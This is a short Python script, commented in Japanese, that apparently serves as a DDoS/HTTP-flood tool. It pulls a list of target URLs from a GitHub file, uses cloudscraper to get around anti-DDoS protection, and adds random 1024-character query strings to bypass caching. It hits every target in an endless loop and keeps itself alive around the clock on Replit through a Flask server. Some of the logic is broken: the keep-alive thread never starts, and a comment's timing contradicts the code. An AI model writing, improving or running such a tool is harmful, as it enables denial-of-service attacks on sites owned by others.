
import requests
import cloudscraper
import time
import random
import string

# keep-alive関数を定義する
def keep_alive():
  # webapp.pyというファイルを作り、flaskでサーバーを立ち上げる[^1^][1]
  from flask import Flask
  from threading import Thread
  def run():
    app.run(host='0.0.0.0',port=8080)

  def keep_alive():
    t = Thread(target=run)
    t.start()
  app = Flask('')

  @app.route('/')
  def index():
    return "Hello. I am alive!"

  
# リストに記載されているURLを読み込む関数を定義する
def read_urls(url):
  # requestsモジュールでテキストファイルを取得する
  response = requests.get(url)
  # テキストファイルの内容を改行で分割してリストにする
  urls = response.text.split('\n')
  # リストを返す
  return urls
def return_urls():
  list_url = 'https://github.com/Tokaaaaage/323/raw/main/list.txt'

  # リストに記載されているURLを読み込む関数を呼び出す
  urls = read_urls(list_url)
  return urls

# URLにアクセスする関数を定義する
def access_url(url):
  list_url = 'https://github.com/Tokaaaaage/323/raw/main/list.txt'

  # リストに記載されているURLを読み込む関数を呼び出す
  urls = read_urls(list_url)
  # cloudscraperモジュールでddos対策プログラムを回避する[^2^][2]
  scraper = cloudscraper.create_scraper()
  # クエリパラメーターとしてランダムな1024文字の文字列を生成する[^3^][3]
  query = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
  # URLにクエリパラメーターを付与する
  url += '?' + query
  # URLにアクセスしてレスポンスを取得する（エラーが発生した場合は例外処理）
  try:
    response = scraper.get(url)
    print(f'Accessed {urls} with status code {response.status_code}')
    return response.status_code
  except Exception as e:
    print(f'Failed to access {urls} with error {e}')
    return None

# メインの処理部分
if __name__ == '__main__':
  
   # keep-alive関数を呼び出してreplitで24時間動かすようにする[^1^][1]
   keep_alive()

   # リストに記載されているURLのアドレス（変更可）
   

   # 無限ループでURLにアクセスし続ける（1秒ごと）
   while True:
     urls = return_urls()
     for url in urls:
       access_url(url)
     time.sleep(10)
